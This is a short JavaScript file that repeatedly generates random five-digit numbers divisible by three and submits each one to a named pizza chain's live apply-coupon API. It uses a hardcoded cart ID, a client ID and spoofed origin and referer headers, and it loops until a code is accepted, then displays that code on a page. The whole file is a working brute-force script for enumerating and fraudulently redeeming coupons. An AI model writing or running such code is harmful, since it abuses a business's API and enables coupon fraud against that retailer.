// Function to generate a random validation code (divisible by 3 and checked via API)
function generateValidationCode() {
    // Function to generate a random number between min and max divisible by 3
    function generateRandomDivisibleBy3(min, max) {
        let num;
        do {
            num = Math.floor(Math.random() * (max - min + 1)) + min;
        } while (num % 3 !== 0);  // Ensure it is divisible by 3
        return num;
    }

    // Function to check if a coupon code is valid or not
    async function checkCoupon(couponCode) {
        const payload = {
            cart_id: "739eba18-28cb-4dd3-b4fd-33e7ac1ec6f8",  // Valid cart ID
            coupon_code: String(couponCode),  // Ensure coupon_code is a string
            order_type: "C",
            store_payments: ["cash", "credit_card", "eftpos"]
        };

        try {
            const response = await fetch('https://apiapse2.phdvasia.com/v1/product-cart-fe/apply-coupon', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'accept': 'application/json, text/plain, */*',
                    'client': '2f28344b-2d60-4754-8985-5c23864a3737',
                    'lang': 'en',
                    'origin': 'https://www.pizzahut.co.nz',
                    'referer': 'https://www.pizzahut.co.nz/'
                },
                body: JSON.stringify(payload)
            });

            const result = await response.json();

            // Treat the coupon as valid if status is true or if error.code is "CP-03"
            if (result.status === true || (result.error && result.error.code === 'CP-03')) {
                return 'Yes';  // Coupon is valid
            }

            // Otherwise, it's invalid
            return 'No';

        } catch (error) {
            console.log('Request failed', error);
            return 'Error';
        }
    }

    // Function to generate a code and check it, repeat if invalid
    async function generateAndCheckCoupon() {
        const min = 10000;
        const max = 99999;
        
        let isValid = 'No';
        let couponCode;

        // Keep generating and checking until a valid code is found
        while (isValid === 'No') {
            couponCode = generateRandomDivisibleBy3(min, max);
            isValid = await checkCoupon(couponCode);  // Check if the coupon is valid
        }

        // Return the valid coupon code
        return couponCode;
    }

    // Return the promise for the valid coupon code
    return generateAndCheckCoupon();
}

// Assign the generated code to the appropriate HTML element
document.addEventListener("DOMContentLoaded", async function() {
    const validationCode = await generateValidationCode(); // Generate the code asynchronously
    const codeElement = document.querySelector('.ValCode'); // Find the element where the code should be displayed
    codeElement.textContent = `Validation Code: ${validationCode}`; // Set the generated code
});
